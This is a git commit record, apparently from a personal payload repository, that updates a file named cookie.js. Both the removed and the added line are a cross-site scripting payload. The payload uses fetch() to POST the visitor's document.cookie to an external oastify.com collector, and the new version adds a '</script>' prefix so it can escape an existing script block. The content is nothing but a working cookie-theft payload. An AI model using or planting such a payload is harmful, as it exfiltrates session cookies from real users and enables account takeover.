5f677b790cc9c41a1b7d4204f2aa84a205de8ba2
vulnoob <200810511+vulnoob@users.noreply.github.com>
2025-12-11 10:40:06 -0600

    Update cookie.js

--- cookie.js
+++ cookie.js
@@ -1,1 +1,1 @@
-<script> fetch('https://hj4j2l4g5vxgk8ciurbpoje5rwxnld92.oastify.com', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>
+</script><script> fetch('https://hj4j2l4g5vxgk8ciurbpoje5rwxnld92.oastify.com', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>
